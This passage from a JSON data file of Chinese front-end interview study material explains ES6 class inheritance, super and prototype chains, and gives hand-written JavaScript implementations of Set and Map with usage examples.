}\n}\n```\n\n上面代码中，`console.log(super)`当中的`super`，无法看出是作为函数使用，还是作为对象使用，所以 JavaScript 引擎解析代码的时候就会报错。这时，如果能清晰地表明`super`的数据类型，就不会报错。\n\n```javascript\nclass A {}\n\nclass B extends A {\n  constructor() {\n    super();\n    console.log(super.valueOf() instanceof B); // true\n  }\n}\n\nlet b = new B();\n```\n\n上面代码中，`super.valueOf()`表明`super`是一个对象，因此就不会报错。同时，由于`super`使得`this`指向`B`的实例，所以`super.valueOf()`返回的是一个`B`的实例。\n\n最后，由于对象总是继承其他对象的，所以可以在任意一个对象中，使用`super`关键字。\n\n```javascript\nvar obj = {\n  toString() {\n    return \"MyObject: \" + super.toString();\n  }\n};\n\nobj.toString(); // MyObject: [object Object]\n```\n\n## 类的 prototype 属性和\\_\\_proto\\_\\_属性\n\n大多数浏览器的 ES5 实现之中，每一个对象都有`__proto__`属性，指向对应的构造函数的`prototype`属性。Class 作为构造函数的语法糖，同时有`prototype`属性和`__proto__`属性，因此同时存在两条继承链。\n\n（1）子类的`__proto__`属性，表示构造函数的继承，总是指向父类。\n\n（2）子类`prototype`属性的`__proto__`属性，表示方法的继承，总是指向父类的`prototype`属性。\n\n```javascript\nclass A {\n}\n\nclass B extends A {\n}\n\nB.__proto__ === A // true\nB.prototype.__proto__ === A.prototype // true\n```\n\n上面代码中，子类`B`的`__proto__`属性指向父类`A`，子类`B`的`prototype`属性的`__proto__`属性指向父类`A`的`prototype`属性。\n\n这样的结果是因为，类的继承是按照下面的模式实现的。\n\n```javascript\nclass A {\n}\n\nclass B {\n}\n\n// B 的实例继承 A 的实例\nObject.setPrototypeOf(B.prototype, A.prototype);\n\n// B 继承 A 的静态属性\nObject.setPrototypeOf(B, A);\n\nconst b = new B();\n```\n\n《对象的扩展》一章给出过`Object.setPrototypeOf`方法的实现。\n\n```javascript\nObject.setPrototypeOf = function (obj, proto) {\n  obj.__proto__ = proto;\n  return obj;\n}\n```\n\n因此，就得到了上面的结果。\n\n```javascript\nObject.setPrototypeOf(B.prototype, A.prototype);\n// 等同于\nB.prototype.__proto__ = A.prototype;\n\nObject.setPrototypeOf(B, A);\n// 等同于\nB.__proto__ = A;\n```\n\n这两条继承链，可以这样理解：作为一个对象，子类（`B`）的原型（`__proto__`属性）是父类（`A`）；作为一个构造函数，子类（`B`）的原型对象（`prototype`属性）是父类的原型对象（`prototype`属性）的实例。\n\n```javascript\nB.prototype = Object.create(A.prototype);\n// 等同于\nB.prototype.__proto__ = A.prototype;\n```\n\n`extends`关键字后面可以跟多种类型的值。\n\n```javascript\nclass B extends A {\n}\n```\n\n上面代码的`A`，只要是一个有`prototype`属性的函数，就能被`B`继承。由于函数都有`prototype`属性（除了`Function.prototype`函数），因此`A`可以是任意函数。\n\n下面，讨论两种情况。第一种，子类继承`Object`类。\n\n```javascript\nclass A extends Object {\n}\n\nA.__proto__ === Object // true\nA.prototype.__proto__ === Object.prototype // true\n```\n\n这种情况下，`A`其实就是构造函数`Object`的复制，`A`的实例就是`Object`的实例。\n\n第二种情况，不存在任何继承。\n\n```javascript\nclass A {\n}\n\nA.__proto__ === Function.prototype // true\nA.prototype.__proto__ === Object.prototype // true\n```\n\n这种情况下，`A`作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承`Function.prototype`。但是，`A`调用后返回一个空对象（即`Object`实例），所以`A.prototype.__proto__`指向构造函数（`Object`）的`prototype`属性。\n\n### 实例的 \\_\\_proto\\_\\_ 属性\n\n子类实例的`__proto__`属性的`__proto__`属性，指向父类实例的`__proto__`属性。也就是说，子类的原型的原型，是父类的原型。\n\n```javascript\nvar p1 = new Point(2, 3);\nvar p2 = new ColorPoint(2, 3, 'red');\n\np2.__proto__ === p1.__proto__ // false\np2.__proto__.__proto__ === p1.__proto__ // true\n```\n\n上面代码中，`ColorPoint`继承了`Point`，导致前者原型的原型是后者的原型。\n\n因此，通过子类实例的`__proto__.__proto__`属性，可以修改父类实例的行为。\n\n```javascript\np2.__proto__.__proto__.printName = function () {\n  console.log('Ha');\n};\n\np1.printName() // \"Ha\"\n```\n\n上面代码在`ColorPoint`的实例`p2`上向`Point`类添加方法，结果影响到了`Point`的实例`p1`。\n\n## 原生构造函数的继承\n\n原生构造函数是指语言内置的构造函数，通常用来生成数据结构。ECMAScript 的原生构造函数大致有下面这些。\n\n-   Boolean()\n-   Number()\n-   String()\n-   Array()\n-   Date()\n-   Function()\n-   RegExp()\n-   Error()\n-   Object()\n\n以前，这些原生构造函数是无法继承的，比如，不能自己定义一个`Array`的子类。\n\n```javascript\nfunction MyArray() {\n  Array.apply(this, arguments);\n}\n\nMyArray.prototype = Object.create(Array.prototype, {\n  constructor: {\n    value: MyArray,\n    writable: true,\n    configurable: true,\n    enumerable: true\n  }\n});\n```\n\n上面代码定义了一个继承 Array 的`MyArray`类。但是，这个类的行为与`Array`完全不一致。\n\n```javascript\nvar colors = new MyArray();\ncolors[0] = \"red\";\ncolors.length  // 0\n\ncolors.length = 0;\ncolors[0]  // \"red\"\n```\n\n之所以会发生这种情况，是因为子类无法获得原生构造函数的内部属性，通过`Array.apply()`或者分配给原型对象都不行。原生构造函数会忽略`apply`方法传入的`this`，也就是说，原生构造函数的`this`无法绑定，导致拿不到内部属性。\n\nES5 是先新建子类的实例对象`this`，再将父类的属性添加到子类上，由于父类的内部属性无法获取，导致无法继承原生的构造函数。比如，`Array`构造函数有一个内部属性`[[DefineOwnProperty]]`，用来定义新属性时，更新`length`属性，这个内部属性无法在子类获取，导致子类的`length`属性行为不正常。\n\n下面的例子中，我们想让一个普通对象继承`Error`对象。\n\n```javascript\nvar e = {};\n\nObject.getOwnPropertyNames(Error.call(e))\n// [ 'stack' ]\n\nObject.getOwnPropertyNames(e)\n// []\n```\n\n上面代码中，我们想通过`Error.call(e)`这种写法，让普通对象`e`具有`Error`对象的实例属性。但是，`Error.call()`完全忽略传入的第一个参数，而是返回一个新对象，`e`本身没有任何变化。这证明了`Error.call(e)`这种写法，无法继承原生构造函数。\n\nES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象`this`，然后再用子类的构造函数修饰`this`，使得父类的所有行为都可以继承。下面是一个继承`Array`的例子。\n\n```javascript\nclass MyArray extends Array {\n  constructor(...args) {\n    super(...args);\n  }\n}\n\nvar arr = new MyArray();\narr[0] = 12;\narr.length // 1\n\narr.length = 0;\narr[0] // undefined\n```\n\n上面代码定义了一个`MyArray`类，继承了`Array`构造函数，因此就可以从`MyArray`生成数组的实例。这意味着，ES6 可以自定义原生数据结构（比如`Array`、`String`等）的子类，这是 ES5 无法做到的。\n\n上面这个例子也说明，`extends`关键字不仅可以用来继承类，还可以用来继承原生的构造函数。因此可以在原生数据结构的基础上，定义自己的数据结构。下面就是定义了一个带版本功能的数组。\n\n```javascript\nclass VersionedArray extends Array {\n  constructor() {\n    super();\n    this.history = [[]];\n  }\n  commit() {\n    this.history.push(this.slice());\n  }\n  revert() {\n    this.splice(0, this.length, ...this.history[this.history.length - 1]);\n  }\n}\n\nvar x = new VersionedArray();\n\nx.push(1);\nx.push(2);\nx // [1, 2]\nx.history // [[]]\n\nx.commit();\nx.history // [[], [1, 2]]\n\nx.push(3);\nx // [1, 2, 3]\nx.history // [[], [1, 2]]\n\nx.revert();\nx // [1, 2]\n```\n\n上面代码中，`VersionedArray`会通过`commit`方法，将自己的当前状态生成一个版本快照，存入`history`属性。`revert`方法用来将数组重置为最新一次保存的版本。除此之外，`VersionedArray`依然是一个普通数组，所有原生的数组方法都可以在它上面调用。\n\n下面是一个自定义`Error`子类的例子，可以用来定制报错时的行为。\n\n```javascript\nclass ExtendableError extends Error {\n  constructor(message) {\n    super();\n    this.message = message;\n    this.stack = (new Error()).stack;\n    this.name = this.constructor.name;\n  }\n}\n\nclass MyError extends ExtendableError {\n  constructor(m) {\n    super(m);\n  }\n}\n\nvar myerror = new MyError('ll');\nmyerror.message // \"ll\"\nmyerror instanceof Error // true\nmyerror.name // \"MyError\"\nmyerror.stack\n// Error\n//     at MyError.ExtendableError\n//     ...\n```\n\n注意，继承`Object`的子类，有一个[行为差异](http://stackoverflow.com/questions/36203614/super-does-not-pass-arguments-when-instantiating-a-class-extended-from-object \"http://stackoverflow.com/questions/36203614/super-does-not-pass-arguments-when-instantiating-a-class-extended-from-object\")。\n\n```javascript\nclass NewObj extends Object{\n  constructor(){\n    super(...arguments);\n  }\n}\nvar o = new NewObj({attr: true});\no.attr === true  // false\n```\n\n上面代码中，`NewObj`继承了`Object`，但是无法通过`super`方法向父类`Object`传参。这是因为 ES6 改变了`Object`构造函数的行为，一旦发现`Object`方法不是通过`new Object()`这种形式调用，ES6 规定`Object`构造函数会忽略参数。\n\n## Mixin 模式的实现\n\nMixin 指的是多个对象合成一个新的对象，新对象具有各个组成成员的接口。它的最简单实现如下。\n\n```javascript\nconst a = {\n  a: 'a'\n};\nconst b = {\n  b: 'b'\n};\nconst c = {...a, ...b}; // {a: 'a', b: 'b'}\n```\n\n上面代码中，`c`对象是`a`对象和`b`对象的合成，具有两者的接口。\n\n下面是一个更完备的实现，将多个类的接口“混入”（mix in）另一个类。\n\n```javascript\nfunction mix(...mixins) {\n  class Mix {\n    constructor() {\n      for (let mixin of mixins) {\n        copyProperties(this, new mixin()); // 拷贝实例属性\n      }\n    }\n  }\n\n  for (let mixin of mixins) {\n    copyProperties(Mix, mixin); // 拷贝静态属性\n    copyProperties(Mix.prototype, mixin.prototype); // 拷贝原型属性\n  }\n\n  return Mix;\n}\n\nfunction copyProperties(target, source) {\n  for (let key of Reflect.ownKeys(source)) {\n    if ( key !== 'constructor'\n      && key !== 'prototype'\n      && key !== 'name'\n    ) {\n      let desc = Object.getOwnPropertyDescriptor(source, key);\n      Object.defineProperty(target, key, desc);\n    }\n  }\n}\n```\n\n上面代码的`mix`函数，可以将多个对象合成为一个类。使用的时候，只要继承这个类即可。\n\n```javascript\nclass DistributedEdit extends mix(Loggable, Serializable) {\n  // ...\n}\n```\n",
    "testPoint": "在 ES6 中，`class` 是对原型继承的语法糖，面试考察不仅限于语法本身，更关注对其**继承机制、本质、局限性和与传统构造函数的对比理解**。\n\n## 一、Class 基本语法\n\n### 1. **声明方式**\n\n```js\nclass Person {\n  constructor(name) {\n    this.name = name;\n  }\n\n  sayHi() {\n    console.log(`Hi, I’m ${this.name}`);\n  }\n}\n```\n\n* 类本身其实是函数（构造函数），`typeof Person === 'function'`。\n* 方法定义在 `Person.prototype` 上（非类本身）。\n\n### 2. **类表达式**\n\n```js\nconst MyClass = class { ... };\n```\n\n## 二、继承机制（`extends` & `super`）\n\n### 1. **子类继承父类**\n\n```js\nclass Student extends Person {\n  constructor(name, grade) {\n    super(name); // 必须先调用 super()\n    this.grade = grade;\n  }\n\n  sayGrade() {\n    console.log(`${this.name} is in grade ${this.grade}`);\n  }\n}\n```\n\n* `extends` 实现原型链继承：`Student.prototype.__proto__ === Person.prototype`\n* `super()` 调用父类构造器，必须在 `this` 之前执行\n* 子类重写父类方法时可通过 `super.method()` 访问父类实现\n\n## 三、类的特性考察点\n\n### 1. **类内部是严格模式**\n\n* 所有类中的代码自动启用严格模式（不显式书写 `use strict`）\n\n### 2. **类没有变量提升**\n\n```js\nnew MyClass(); // ReferenceError\nclass MyClass {}\n```\n\n### 3. **类方法不可枚举**\n\n* 类的方法定义在 `prototype` 上，默认是 `non-enumerable`\n\n### 4. **类本质**\n\n* `class` 是一个语法糖，本质仍是基于原型的继承：\n\n```js\nconsole.log(typeof Person); // \"function\"\nconsole.log(Person.prototype.constructor === Person); // true\n```\n\n## 四、静态方法与静态属性\n\n```js\nclass Tool {\n  static log() {\n    console.log('log');\n  }\n\n  static version = '1.0.0';\n}\n```\n\n* `Tool.log()` 是类方法，不属于实例\n* 静态属性是 ES2022 的标准，早期只能手动添加 `Tool.version = '1.0.0'`\n\n## 五、公私字段（类字段）\n\n### 1. **实例字段**\n\n```js\nclass Counter {\n  count = 0; // 公共字段，定义在实例上\n}\n```\n\n### 2. **私有字段（ES2022）**\n\n```js\nclass Secret {\n  #password = '123456';\n\n  getPassword() {\n    return this.#password;\n  }\n}\n```\n\n* 私有字段必须以 `#` 开头，外部无法访问\n* 不可被继承或反射访问（Reflect 无法获取）\n\n## 六、与构造函数的对比考察点\n\n| 对比项      | ES5 构造函数         | ES6 class      |\n| -------- | ---------------- | -------------- |\n| 原型链继承方式  | 手动设置 prototype   | `extends` 简洁明了 |\n| 调用 super | 无 super，需手动继承    | `super()` 必须调用 |\n| 是否提升     | 函数有提升            | class 不提升      |\n| 方法定义     | 需手动挂载在 prototype | 自动挂载           |\n| 私有属性支持   | 需要闭包或 Symbol 实现  | 支持 `#私有字段`     |\n| 可读性和组织性  | 差                | 更强，接近面向对象风格    |\n",
    "exerciseKeyList": "[\"1036468a-13c7-49d5-af8f-31c31135ceea\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2024-10-02T14:50:48.000Z",
    "updateAt": "2025-07-17T14:47:58.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1036468a-13c7-49d5-af8f-31c31135ceea",
        "title": "es5 中的类和es6中的class有什么区别？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-08T15:30:16.000Z",
        "updateAt": "2024-08-18T12:57:58.000Z"
      }
    ]
  },
  "58": {
    "id": 58,
    "tagId": 24,
    "title": "Map与Set",
    "explanation": "每当去学习ES6的时候，我都会不由自主的打开阮一峰老师的[《ES6入门》](http://es6.ruanyifeng.com/#docs/set-map \"http://es6.ruanyifeng.com/#docs/set-map\")去学习和查找用法，相信大多数同学也都和我一样看过阮老师写的文章。\n\n当然大家也都知道ES6里常用的API就那么些，不多不少，用在项目中也是刚刚好。\n\n不过在每次读到Set和Map数据结构那一章的时候，总是有点不知所措，因为我不明白实现这样的数据结构，目的是什么，意义又是什么呢\n\nSet和Map主要的应用场景在于**数组去重**和**数据存储**，幸运的是在读了关于数据结构和算法之类的书籍后，恍然大悟的发现\n\n原来Set是一种叫做**集合**的数据结构，Map是一种叫做**字典**的数据结构\n\n那么下面就来了解下这两种数据结构，最后来亲手实现的一个ES6中的Set和Map吧\n\n### 集合\n\n-   集合是由一组无序且唯一(即不能重复)的项组成的，可以想象成集合是一个既没有重复元素，也没有顺序概念的数组\n-   ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值\n-   Set 本身是一个构造函数，用来生成 Set 数据结构\n-   这里说的Set其实就是我们所要讲到的集合，先来看下基础用法\n\n```bash\nconst s = new Set();\n\n[2, 3, 5, 4, 5, 2, 2].forEach(x => s.add(x));\n\nfor (let i of s) {\n  console.log(i);   // 2 3 5 4\n}\n\n// 去除数组的重复成员\nlet array = [1,2,1,4,5,3];\n[...new Set(array)]     // [1, 2, 4, 5, 3]\n```\n\n具体用法如果还有不清楚的，这里我会在后面一一细说。现在还是来看一下以ES6中Set类(数据结构)为基础实现的集合吧\n\n#### Set实例的属性和方法\n\n-   Set的属性：\n    -   size：返回集合所包含元素的数量\n-   Set的方法：\n    -   操作方法\n        -   add(value)：向集合添加一个新的项\n        -   delete(value)：从集合中移除一个值\n        -   has(value)：如果值在集合中存在，返回true,否则false\n        -   clear(): 移除集合里所有的项\n    -   遍历方法\n        -   keys()：返回一个包含集合中所有键的数组\n        -   values()：返回一个包含集合中所有值的数组\n        -   entries：返回一个包含集合中所有键值对的数组(感觉没什么用就不实现了)\n        -   forEach()：用于对集合成员执行某种操作，没有返回值\n\n### 创建一个集合\n\n```bash\nfunction Set(arr = []) {    // 可以传入数组\n    let items = {};\n    this.size = 0;  // 记录集合中成员的数量\n}\n\nmodule.exports = Set;\n```\n\n这里用{}对象来表示集合，也是因为对象不允许一个键指向两个不同的属性，保证了集合里的元素都是唯一的\n\n接下来，就需要按照ES6中Set类的实现，添加一些集合的**操作方法**了\n\n#### has方法\n\n首先要实现的是has方法，因为在add和delete等其他方法中都会被调用，下面来看一下它的实现\n\n```bash\nfunction Set() {\n    let items = {};\n    this.size = 0;\n    \n    // has(val)方法\n    this.has = function(val) {\n        // 对象都有hasOwnProperty方法，判断是否拥有特定属性\n        return items.hasOwnProperty(val);  \n    };\n}\n```\n\n#### add方法\n\n接下来要实现add方法\n\n```bash\n    // add(val)方法\n    this.add = function(val) {\n        if (!this.has(val)) {\n            items[val] = val;\n            this.size++;    // 累加集合成员数量\n            return true;\n        }\n        return false;\n    };\n```\n\n对于给定的val，可以检测是否存在于集合中\n\n-   如果不存在，就添加到集合中，返回true\n-   如果存在，就直接返回false，不做任何操作\n\n#### delete和clear方法\n\n继续写着，这回把两个都写上\n\n```bash\n    // delete(val)方法\n    this.delete = function(val) {\n        if (this.has(val)) {\n            delete items[val];  // 将items对象上的属性删掉\n            this.size--;\n            return true;\n        }\n        return false;\n    };\n    // clear方法\n    this.clear = function() {\n        items = {};     // 直接将集合赋一个空对象即可\n        this.size = 0;\n    };\n```\n\n在delete方法中，判断val是否存在于集合中，如果存在就直接从集合中删掉，返回true\n\n以上完成的都是**操作方法**，下面我们再来实现一下**遍历方法**\n\n#### keys、values方法\n\n这两个方法我们可以放在一起来实现，因为通过ES6对Object的扩展可以轻松实现对应的方法，下面看一下具体实现，上代码：\n\n```bash\n    // keys()方法\n    this.keys = function() {\n        return Object.keys(items);  // 返回遍历集合的所有键名的数组\n    };\n    // values()方法\n    this.values = function() {\n        return Object.values(items);  // 返回遍历集合的所有键值的数组\n    };\n```\n\n使用一下看看\n\n```bash\n// set.js\nconst Set = require('./Set.js');    // 导入写好的Set类\nlet set = new Set();\nset.add(1);\nset.add(3);\nset.add(2);\nconsole.log(set.keys());    // [ '1', '2', '3' ]\nconsole.log(set.values());  // [ 1, 2, 3 ]\n```\n\n这里我们看到和ES6中的Set有点区别，因为Object的这几个方法都是按照数值大小，从小到大遍历的数组，所以大家知道这一点比较好，具体实现还是有些不同的，哈哈\n\n#### forEach方法\n\nES6中Set结构的实例上带的forEach方法，其实和数组的forEach方法很相似，只不过Set结构的键名就是键值，所以第一个参数与第二个参数的值永远都是一样的\n\n下面就按照实现数组的forEach方法，我们来完成Set的forEach方法\n\n```bash\n    // forEach(fn, context)方法\n    this.forEach = function(fn, context = this) {\n        for (let i = 0; i < this.size; i++) {\n            let item = Object.keys(items)[i];\n            fn.call(context, item, item, items);     \n        }\n    };\n```\n\n使用forEach方法\n\n```bash\n// set.js\nconst Set = require('./Set.js');\nlet set = new Set();\nset.add(1);\nset.add(4);\nset.add('3');\nset.forEach((value, key) => console.log(key + ' : ' + value));  // 1:1, 3:3, 4:4\nlet arr = set.values();     // [ 1, 3, 4 ]\narr = new Set(arr.map(x => x * 2)).values();\nconsole.log(arr);           // [ 2, 6, 8 ]\n```\n\n基本上实现了Set结构的方法，不过，发现一个问题，那就是每次添加一个元素都要add这样写起来确实好麻烦，Set是可以接收一个数组作为参数的，那么我们把这个也实现一下\n\n```bash\nfunction Set(arr = []) {    // 传入接受的数组，如果没有传指定一个空数组做为初始值\n    let items = {};\n    this.size = 0;\n    // has方法\n    this.has = function (val) {\n        return items.hasOwnProperty(val);\n    };\n    // add方法\n    this.add = function (val) {\n        // 如果没有存在items里面就可以直接写入\n        if (!this.has(val)) {\n            items[val] = val;\n            this.size++;\n            return true;\n        }\n        return false;\n    };\n    arr.forEach((val, i) => {   // 遍历传入的数组\n        this.add(val);          // 将数组里每一项值添加到集合中\n    });\n    // 省略...\n}\n```\n\n再来看看现在能不能支持传入的数组了\n\n```bash\n// 间接使用map和filter\nconst Set = require('./Set.js');\nlet arr = new Set([1, 2, 3]).values();\nm = new Set(arr.map(x => x * 2));\nf = new Set(arr.filter(x => x>1));\nconsole.log(m.values());    // [ 2, 4, 6 ]\nconsole.log(f.values());    // [ 2, 3 ]\n\n// 数组去重\nlet arr2 = new Set([3, 5, 2, 1, 2, 5, 5]).values();\nconsole.log(arr2);  // [ 1, 2, 3, 5 ]\n```\n\n现在我们有了一个和ES6中非常类似的Set类实现。如前所述，也可以用数组替代对象，存储元素。喜欢动手的同学们，之后也可以去尝试一下\n\n除此之外，Set还可以实现并集(union),交集(intersect),差集(difference)\n\n做事还是要做全套的，我们也一一来实现一下吧\n\n#### union并集和intersect交集\n\n-   并集的数学概念，集合A和集合B的并集，表示为A∪B\n-   交集的数学概念，集合A和集合B的交集，表示为A∩B\n\n如图所示：\n\n![](https://static.ecool.fun//article/f1453b0f-8ab3-4de5-83c9-fcfda802a82a.png)\n\n现在先来实现union方法\n\n```bash\n    // 并集\n    this.union = function (other) {\n        let union = new Set();\n        let values = this.values();\n        for (let i = 0; i < values.length; i++) {\n            union.add(values[i]);\n        }\n        values = other.values();    // 将values重新赋值为新的集合\n        for (let i = 0; i < values.length; i++) {\n            union.add(values[i]);\n        }\n\n        return union;\n    };\n    // 交集\n    this.intersect = function (other) {\n        let intersect = new Set();\n        let values = this.values();\n        for (let i = 0; i < values.length; i++) {\n            if (other.has(values[i])) {     // 查看是否也存在于other中\n                intersect.add(values[i]);   // 存在的话就像intersect中添加元素\n            }\n        }\n        return intersect;\n    };\n```\n\n再来看下difference差集的实现，之后一起再测试一番\n\n#### difference差集\n\n-   差集的数学概念，集合A和集合B的差集，表示为A-B\n\n![](https://static.ecool.fun//article/e82f5480-3c00-476d-8ae8-e1a5da926e8e.png)\n\n```bash\n    // 差集\n    this.difference = function (other) {\n        let difference = new Set();\n        let values = this.values();\n        for (let i = 0; i < values.length; i++) {\n            if (!other.has(values[i])) {    // 将不存在于other集合中的添加到新的集合中\n                difference.add(values[i]);\n            }\n        }\n        return difference;\n    };\n```\n\n#### Set完整实现\n\n在此，先给大家贴一下**完整的实现代码**\n\n```bash\nfunction Set(arr = []) {\n    let items = {};\n    this.size = 0;\n    // has方法\n    this.has = function (val) {\n        return items.hasOwnProperty(val);\n    };\n    // add方法\n    this.add = function (val) {\n        // 如果没有存在items里面就可以直接写入\n        if (!this.has(val)) {\n            items[val] = val;\n            this.size++;\n            return true;\n        }\n        return false;\n    };\n    arr.forEach((val, i) => {\n        this.add(val);\n    });\n    // delete方法\n    this.delete = function (val) {\n        if (this.has(val)) {\n            delete items[val];  // 将items对象上的属性删掉\n            this.size--;\n            return true;\n        }\n        return false;\n    };\n    // clear方法\n    this.clear = function () {\n        items = {};\n        this.size = 0;\n    };\n    // keys方法\n    this.keys = function () {\n        return Object.keys(items);\n    };\n    // values方法\n    this.values = function () {\n        return Object.values(items);\n    }\n    // forEach方法\n    this.forEach = function (fn, context = this) {\n        for (let i = 0; i < this.size; i++) {\n            let item = Object.keys(items)[i];\n            fn.call(context, item, item, items);\n        }\n    }\n\n    // 并集\n    this.union = function (other) {\n        let union = new Set();\n        let values = this.values();\n\n        for (let i = 0; i < values.length; i++) {\n            union.add(values[i]);\n        }\n        values = other.values();    // 将values重新赋值为新的集合\n        for (let i = 0; i < values.length; i++) {\n            union.add(values[i]);\n        }\n\n        return union;\n    };\n    // 交集\n    this.intersect = function (other) {\n        let intersect = new Set();\n        let values = this.values();\n        for (let i = 0; i < values.length; i++) {\n            if (other.has(values[i])) {\n                intersect.add(values[i]);\n            }\n        }\n        return intersect;\n    };\n    // 差集\n    this.difference = function (other) {\n        let difference = new Set();\n        let values = this.values();\n        for (let i = 0; i < values.length; i++) {\n            if (!other.has(values[i])) {\n                difference.add(values[i]);\n            }\n        }\n        return difference;\n    };\n    // 子集\n    this.subset = function(other) {\n        if (this.size > other.size) {\n            return false;\n        } else {\n            let values = this.values();\n            for (let i = 0; i < values.length; i++) {\n                console.log(values[i])\n                console.log(other.values())\n                if (!other.has(values[i])) {\n                    return false;\n                }\n            }\n            return true;\n        }\n    };\n}\n\nmodule.exports = Set;\n```\n\n写了辣么多一起来测试一下吧\n\n```bash\nconst Set = require('./Set.js');\nlet set = new Set([2, 1, 3]);\nconsole.log(set.keys());    // [ '1', '2', '3' ]\nconsole.log(set.values());  // [ 1, 2, 3 ]\nconsole.log(set.size);      // 3\nset.delete(1);\nconsole.log(set.values());  // [ 2, 3 ]\nset.clear();\nconsole.log(set.size);      // 0\n\n// 并集\nlet a = [1, 2, 3];\nlet b = new Set([4, 3, 2]);\nlet union = new Set(a).union(b).values();\nconsole.log(union);     // [ 1, 2, 3, 4 ]\n\n// 交集\nlet c = new Set([4, 3, 2]);\nlet intersect = new Set([1,2,3]).intersect(c).values();\nconsole.log(intersect); // [ 2, 3 ]\n\n// 差集\nlet d = new Set([4, 3, 2]);\nlet difference = new Set([1,2,3]).difference(d).values();\n// [1,2,3]和[4,3,2]的差集是1\nconsole.log(difference);    // [ 1 ]\n```\n\n目前为止我们用集合这种数据结构就实现了类似ES6中Set类，上面的使用方法也基本一样，大家可以之后有时间的话动手去敲一敲看一看，走过路过不能错过\n\n既然我们已经完成了Set的实现，那么好事要成双，一鼓作气再把Map也一起写出来，天了撸的，开始\n\n### 字典\n\n在数据结构还有一种结构叫做**字典**，它就是实现基于ES6中的Map类的结构\n\n那么集合又和字典有什么区别呢：\n\n-   共同点：集合、字典可以存储不重复的值\n-   不同点：集合是以\\[值，值\\]的形式存储元素，字典是以\\[键，值\\]的形式存储\n\n所以这一下让我们明白了，Map其实的主要用途也是用于存储数据的，相比于Object只提供“字符串—值”的对应，Map提供了“值—值”的对应。也就是说如果你需要“键值对”的数据结构，Map比Object更合适\n\n下面来看一下基本使用：\n\n```bash\nconst m = new Map();\nconst o = {p: 'Hello World'};\nm.set(o, 'content')\nm.get(o) // \"content\"\n\nm.has(o) // true\nm.delete(o) // true\nm.has(o) // false\n```\n\n以上是Map的基本使用，还有更多有用的方法稍后会随着实现的深入分别展示\n\n#### Map的属性和方法\n\n属性：\n\n-   size：返回字典所包含的元素个数\n\n操作方法：\n\n-   set(key, val): 向字典中添加新元素\n-   get(key):通过键值查找特定的数值并返回\n-   has(key):如果键存在字典中返回true,否则false\n-   delete(key): 通过键值从字典中移除对应的数据\n-   clear():将这个字典中的所有元素删除\n\n遍历方法：\n\n-   keys():将字典中包含的所有键名以数组形式返回\n-   values():将字典中包含的所有数值以数组形式返回\n-   forEach()：遍历字典的所有成员\n\n知道了都有哪些属性和方法，那就闲言少叙，开始创建一个字典吧\n\n#### 创建一个字典\n\n```bash\nfunction Map() {\n    let items = {};\n}\n\nmodule.exports = Map;   // 导出\n```\n\n创建好了字典这个骨架，那就开始添加一些方法了\n\n#### has方法\n\n首当其冲的当然是has了，因为在set和get里都会用到，实现思路和之前写的集合也很类似\n\n```bash\nfunction Map() {\n    let items = {};\n    // has(key)方法\n    this.has = function(val) {\n        return items.hasOwnProperty(val);\n    };\n}\n```\n\n实现了has方法后，我们可以来判断字典中是否包含该属性了，继续来实现其他方法\n\n#### set和get方法\n\n```bash\n    // set(key, val)方法\n    // set相同key时，后面声明的会覆盖前面\n    // 如： new Map().set({}, 'a')\n    this.set = function(key, val) {\n        items[key] = val;   \n    };\n    // get(key)方法\n    this.get = function(key) {\n        // 判断是否有key，如果有的话直接返回对应的值\n        // 如果读取一个未知的键，则返回undefined\n        return this.has(key) ? items[key] : undefined;\n    };\n```\n\nset和get方法写好了，再接着搞delete和clear方法，不废话，看\n\n#### delete和clear方法\n\n```bash\n    // delete(key)方法\n    this.delete = function(key) {\n        if (this.has(key)) {    // 如果有key值\n            delete items[key];  // 直接删掉items上对应的属性\n            this.size--;        // 让size总数减1\n            return true;\n        }\n        return false;\n    };\n    // clear()方法\n    this.clear = function() {\n        items = {};\n        this.size = 0;\n    };\n```\n\n上面把属性和操作方法都分别完成了，还剩下最后的遍历方法了，继续写下去，坚持到底就是胜利，各位看官也不容易了，加油加油！！！\n\n#### 遍历方法(keys,values,forEach)\n\n```bash\n    // keys()方法\n    this.keys = function() {\n        return Object.keys(items);\n    };\n    // values()方法\n    this.values = function() {\n        return Object.values(items);  \n    };\n    // forEach(fn, context)方法\n    this.forEach = function(fn, context = this) {\n        for (let i = 0; i < this.size; i++) {\n            let key = Object.keys(items)[i];\n            let value = Object.values(items)[i];\n            fn.call(context, value, key, items);\n        }\n    };\n```\n\nNow终于完成了Map类的实现，我给大家贴一下完整代码和测试用例，供大家空闲时间来研究分析分析\n\n#### Map完整实现\n\n```bash\nfunction Map() {\n    let items = {};\n    this.size = 0;\n\n    // 操作方法\n    // has方法\n    this.has = function(val) {\n        return items.hasOwnProperty(val);\n    };\n    // set(key, val)方法\n    this.set = function(key, val) {\n        items[key] = val;\n        this.size++;\n    };\n    // get(key)方法\n    this.get = function(key) {\n        return this.has(key) ? items[key] : undefined;\n    };\n    // delete(key)方法\n    this.delete = function(key) {\n        if (this.has(key)) {\n            delete items[key];\n            this.size--;\n            return true;\n        }\n        return false;\n    };\n    // clear()方法\n    this.clear = function() {\n        items = {};\n        this.size = 0;\n    };\n    // 遍历方法\n    // keys()方法\n    this.keys = function() {\n        return Object.keys(items);\n    };\n    // values()方法\n    this.values = function() {\n        return Object.values(items);\n    };\n    // forEach(fn, context)方法\n    this.forEach = function(fn, context = this) {\n        for (let i = 0; i < this.size; i++) {\n            let key = Object.keys(items)[i];\n            let value = Object.values(items)[i];\n            fn.call(context, value, key, items);\n        }\n    };\n}\n\nmodule.exports = Map;\n```\n\n再来看看下面的测试栗子\n\n```bash\n    // map.js\n    // 使用Map类\n    const Map = require('./Map.js');\n    let m = new Map();\n    m.set('Jay', 'Jay的Chou');\n    m.set(true, '真的');\n    console.log(m.has('Chou'));  // false\n    console.log(m.size);        // 2\n    console.log(m.keys());      // [ 'Jay', 'true' ]\n    console.log(m.values());    // [ 'Jay的Chou', '真的' ]\n    console.log(m.get('jay'));  // undefined\n    \n    m.delete(true);\n    console.log(m.keys());      // [ 'Jay' ]\n    console.log(m.values());    // [ 'Jay的Chou' ]\n```",
